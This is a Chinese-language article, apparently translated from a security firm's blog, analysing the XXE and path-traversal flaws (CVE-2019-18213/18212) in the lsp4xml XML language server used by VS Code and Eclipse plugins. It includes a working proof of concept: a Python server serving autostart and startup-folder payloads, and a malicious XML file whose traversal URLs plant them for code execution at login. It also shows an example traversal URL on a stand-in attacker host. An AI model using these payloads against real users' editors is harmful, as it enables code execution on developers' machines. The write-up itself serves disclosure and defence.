<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>VSCode 打开 XML 文件可能导致命令执行</title>
</head>
<body>
<p><a href="https://zhuanlan.zhihu.com/p/103044773">原文</a></p>
<div class="title-image"><img src="https://pic4.zhimg.com/v2-96a8fd622af532186aaf65a15caa3bb6_b.jpg" alt=""></div><p>2019 年中，XXE 漏洞“横行”，相比以往而言，XXE 漏洞额外的多。例如：通过 OpenCMS 利用 Apache Solr</p><p><b>LSP4XML（XML 语言服务器）</b></p><p>是一个XML语言具体实现语言服务器协议，可与任何编辑器使用支持该协议，以提供良好的支持XML语言。</p><p><a href="https://link.zhihu.com/?target=https%3A//github.com/angelozerr/lsp4xml" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://</span><span class="visible">github.com/angelozerr/l</span><span class="invisible">sp4xml</span><span class="ellipsis"></span></a></p><p>用于解析 VSCode-XML 中的 XML 文件，Eclipse 的 wildwebdeveloper，theia-xml等的库。受到 XXE（CVE-2019-18213）的影响，通过打开恶意 XML 文件可导致 RCE（CVE-2019-18212）被利用。</p><figure data-size="small"><noscript><img src="https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg" data-caption="" data-size="small" data-rawwidth="1682" data-rawheight="761" class="origin_image zh-lightbox-thumb" width="1682" data-original="https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_r.jpg"/></noscript><img src="https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg" data-caption="" data-size="small" data-rawwidth="1682" data-rawheight="761" class="origin_image zh-lightbox-thumb lazy" width="1682" data-original="https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg"/></figure><blockquote>CVE-2019-18213：XXE <a href="https://link.zhihu.com/?target=https%3A//nvd.nist.gov/vuln/detail/CVE-2019-18213" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://</span><span class="visible">nvd.nist.gov/vuln/detai</span><span class="invisible">l/CVE-2019-18213</span><span class="ellipsis"></span></a><br/>适用于 Visual Studio 和其他产品的 0.9.1 之前的 Red Hat XML 语言拓展（aka vscode-xml）中使用的 0.9.1 之前的 XML 语言服务器（aka lsp4xml）允许通过精心制作的 XML 文档进行 XXE，并生成 SSRF 及 SMB 连接启动等。存在于extensions / contentmodel / participants / diagnostics / LSPXMLParserConfiguration.java 中。<br/>CVE-2019-18212：目录遍历 <a href="https://link.zhihu.com/?target=https%3A//nvd.nist.gov/vuln/detail/CVE-2019-18212" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://</span><span class="visible">nvd.nist.gov/vuln/detai</span><span class="invisible">l/CVE-2019-18212</span><span class="ellipsis"></span></a><br/>0.9.1 之前的 XML 语言服务器（aka lsp4xml）中的 XMLLanguageService.java（用于 Visual Studio 和其他产品的 0.9.1 之前的 Red Hat XML 语言拓展（aka vscode-xml））允许远程攻击者通过目录遍历写入任意文件。</blockquote><h2>XXE 奇遇</h2><p>拿一个标准的 XXE payload，并带有指向我们监听网络服务器的外部 DTD，目标服务器无法执行对互联网的 HTTP 请求，所以按道理只会存在一个 DNS 的交互过程，但是随后收到了两个不同的 DNS 交互和一个 HTTP 请求，这是为什么？</p><h2>探究</h2><p>在我尝试找出交互的原因时，发现 HTTP 请求来自我自己的 IP 地址，这就奇怪了。</p><p>为了一探究竟，当我在 VS Code 中保存新的 XML payload 时，使用新的 Burp Collaborator 实例作为回调服务器重播所有操作步骤，并触发了 XXE。不过，可能和 VS Code 并没有任何关系。。。</p><p>所有，先检查了一遍 VS Code 的配置和插件等，然后发现安装了一个名为 XML 的插件，由 RedHat 发布的。（应该是 VS Code 推荐安装的）</p><figure data-size="small"><noscript><img src="https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg" data-caption="" data-size="small" data-rawwidth="1623" data-rawheight="812" class="origin_image zh-lightbox-thumb" width="1623" data-original="https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_r.jpg"/></noscript><img src="https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg" data-caption="" data-size="small" data-rawwidth="1623" data-rawheight="812" class="origin_image zh-lightbox-thumb lazy" width="1623" data-original="https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg"/></figure><blockquote>XML 该拓展插件的作用是提供了对创建和编辑 XML 文档的支持，它基于使用 Java 运行的 LSP4XML 语言服务器。</blockquote><p>第一想到的就是禁用它，然后再进行后面的实验步骤。</p><p>VSCode-XML 使你可以打开 XML / DTD / XSTL / XSD 文件并解析它们的语法错误，重点是根据 DTD / XSD 定义验证 XML / XSTL 文件。</p><p>可知 XXE 漏洞本身在于 LSP4XML：在安装了 VSCode-XML 的 VS Code 中打开 XML 文件编辑或保存时，LSP4XML 在本地解析文件并在 VS Code 界面中报错。</p><p><b>以此构造一个恶意文件，当安装了 VSCode-XML 的 VS Code 的目标打开该 XML 文件时，实现一系列利用操作。</b></p><p>尝试了在这种情况下使用的常见渗透方法，但是由于最近的 Java 版本（1.8+）和 URL 解析的结合，所有操作都失败了。</p><p>可以执行的只有：</p><ul><li>盲 SSRF</li><li>Windows 上的 NetNTLMv2 渗透</li></ul><h2>实验</h2><p>在玩 XXE 时，发现一种奇怪的的行为：url 仅搜索一次，再次进行操作就不会去搜索。应该是存在某种缓存机制，将 DTD 的文件下载并存储在某个地方。</p><p><b>缓存机制：</b></p><ol><li>解析 XML 文件</li><li>如果引用了外部实体，则注明其 URL</li><li>通过检查目录 $HOME/.lsp4xml/cache/http/$host/$path_of_file，使用指定的 URL 验证来自同一主机的文件是否已被缓存</li><li>如果缓存条目不存在，则文件被下载并移至$HOME/.lsp4xml/cache/http/$host/$path_of_file</li></ol><p><b>那么问题来了，路径能不能被控制？</b></p><p>如果外部实体 URL 路径中包含 ../ 会发生什么？</p><p>经实验，缓存过程在保存缓存文件时会受到路径遍历的影响，从而可以在任意本地目录中写入任意远程文件。如果尚未创建所需的文件夹结构，此过程也能实现。</p><h2>从 XXE 到 RCE</h2><p>漏洞存在的原因是在缓存的最后一步，如果缓存条目不存在，则文件被下载并移至对应的目录，其中参数 $path_of_file 可被控制，比如外部实体的 URL 为：</p><div class="highlight"><pre><code class="language-text">http://attack.er/../../../../Desktop/test.txt</code></pre></div><p>缓存文件将被写入 $HOME/Desktop/test.txt，从而导致任意文件写入。</p><p>唯一的限制就是缓存机制的第 3 点，因此无法覆盖任何文件，并且所有操作都是使用当前用户权限完成的（因此，如果当前用户是管理员，我们可以在任何地方写，否则只能在其主目录可写）。</p><p>可以通过滥用启动/自动启动机制来轻松实现RCE：</p><ul><li>在 Windows 系统上，通过将批处理文件引用为外部实体并使用遍历路径将其写入 $HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ 文件夹中。</li><li>在大多数 GNU/Linux 系统上，通过在 $HOME/.config/autostart/ 文件夹中编写一个“desktop”文件。</li></ul><p>只需要等待受害者注销并再次在其计算机上登录以获得执行的代码即可。</p><h2>影响</h2><p>在完成 LSP4XML 的利用链之后，除 VSCode-XML 之外，还发现 Eclipse 的 wildwebdeveloper 扩展和 theia-xml-extension 也在使用该库，因此都容易受到攻击。</p><h2>实践</h2><p>以下是在 Windows 和 GNU/Linux 系统上利用 XXE 并实现 RCE 的步骤：</p><p>首先，安装 VS Code 和 vscode-xml 扩展&lt;0.9.1版本（注意：目前最新为 0.10.1）。</p><p>创建 server.py（Python3）并运行</p><div class="highlight"><pre><code class="language-text">#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
 
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header(&#39;Content-type&#39;, &#39;application/octet-stream&#39;)
        self.end_headers()
        if &#39;.desktop&#39; in self.path:
            self.wfile.write(b&#39;[Desktop Entry]\nName=Exploit\nGenericName=\nComment=\nExec=sh -c &#34;id;read&#34;\nTerminal=true\nType=Application\nX-GNOME-Autostart-enabled=true&#39;)	
        else:
            self.wfile.write(b&#39;start cmd.exe /k &#34;whoami&#34;&#39;)
        
def run(server_class=HTTPServer, handler_class=RequestHandler, port=9000):
    server_address = (&#39;&#39;, port)
    httpd = server_class(server_address, handler_class)
    print(&#39;Starting httpd on port {}...&#39;.format(port))
    httpd.serve_forever()
 
run()</code></pre></div><p>在 VS code 中新建文件并输入：</p><div class="highlight"><pre><code class="language-text">&lt;?xml version=&#34;1.0&#34;?&gt;
&lt;!DOCTYPE r [ 
    &lt;!ENTITY linux SYSTEM &#34;http://127.0.0.1:9000/../../../../.config/autostart/cmd.desktop&#34;&gt;
    &lt;!ENTITY windows SYSTEM &#34;http://127.0.0.1:9000/../../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/cmd.bat&#34;&gt; 
]&gt;
&lt;r&gt;&amp;linux;&amp;windows;&lt;/r&gt;</code></pre></div><p>然后保存该 XML 文件。</p><p>观察对 Python3 Web 服务器的请求，当用户执行注销或登录，将执行注入命令（在 Windows 上打开“命令提示符”并执行 whoami 命令，在 GNU/Linux 上打开终端并执行 id 命令）</p><p>具体操作：<a href="https://link.zhihu.com/?target=https%3A//www.shielder.it/blog/wp-content/uploads/2019/10/Video-xxe-3.gif" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://www.</span><span class="visible">shielder.it/blog/wp-con</span><span class="invisible">tent/uploads/2019/10/Video-xxe-3.gif</span><span class="ellipsis"></span></a> </p><h2>防范</h2><p>及时更新插件 VS Code-XML 的版本。</p><p>源自：<a href="https://link.zhihu.com/?target=https%3A//www.shielder.it/blog/dont-open-that-xml-xxe-to-rce-in-xml-plugins-for-vs-code-eclipse-theia/" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://www.</span><span class="visible">shielder.it/blog/dont-o</span><span class="invisible">pen-that-xml-xxe-to-rce-in-xml-plugins-for-vs-code-eclipse-theia/</span><span class="ellipsis"></span></a> </p><p><a href="https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a" class=" wrap external" target="_blank" rel="nofollow noreferrer">二向箔安全</a>的网络安全技能包更新了！CISP-PTE 认证技能包，让你免费体验 CISP-PTE 认证内容。</p><figure data-size="normal"><noscript><img src="https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg" data-caption="" data-size="normal" data-rawwidth="3058" data-rawheight="1720" class="origin_image zh-lightbox-thumb" width="3058" data-original="https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg"/></noscript><img src="https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg" data-caption="" data-size="normal" data-rawwidth="3058" data-rawheight="1720" class="origin_image zh-lightbox-thumb lazy" width="3058" data-original="https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg"/></figure><p>更多有关渗透测试的内容请前往<a href="https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a" class=" wrap external" target="_blank" rel="nofollow noreferrer">二向箔安全</a>进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 <b>twosecurity02</b></p><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg" data-caption="" data-size="normal" data-rawwidth="3041" data-rawheight="2000" class="origin_image zh-lightbox-thumb" width="3041" data-original="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg"/></noscript><img src="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg" data-caption="" data-size="normal" data-rawwidth="3041" data-rawheight="2000" class="origin_image zh-lightbox-thumb lazy" width="3041" data-original="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg"/></figure><p></p><p></p>
<script async defer="defer" src="https://www.googletagmanager.com/gtag/js?id=UA-7909075-5"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){ dataLayer.push(arguments); }
gtag('js', new Date());
gtag('config', 'UA-7909075-5');
</script>
<script>
var _hmt = _hmt || [];
</script>
<script async defer="defer" src="https://hm.baidu.com/hm.js?e3d40295e416616ddc21287da9646d31"></script>
</body>
</html>
